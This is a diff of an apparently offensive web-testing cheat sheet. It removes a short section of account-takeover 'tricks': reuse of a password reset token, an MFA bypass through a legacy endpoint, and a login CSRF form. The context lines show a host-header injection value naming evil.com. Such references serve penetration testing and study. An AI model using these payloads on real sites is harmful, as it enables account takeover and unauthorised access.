@@ -227,16 +227,3 @@ Forwarded: [host=evil.com](<http://host=evil.com/>)
 Forwarded: [host=legitimate.com](<http://host=legitimate.com/>)
 ```
 
-## New Tricks
-
-### Trick 1
-- Scenario: Password reset token reusable after successful password change flow.
-- Payload: `POST /reset {"token":"<old-token>","password":"NewPass!123"}`
-
-### Trick 2
-- Scenario: MFA bypass by forcing legacy endpoint lacking second-factor check.
-- Payload: `GET /api/v1/account?mfa=0`
-
-### Trick 3
-- Scenario: Login CSRF linked victim session to attacker-controlled account.
-- Payload: `<form action="https://target.com/login" method="POST"><input name="u" value="attacker"><input name="p" value="pass"></form>`
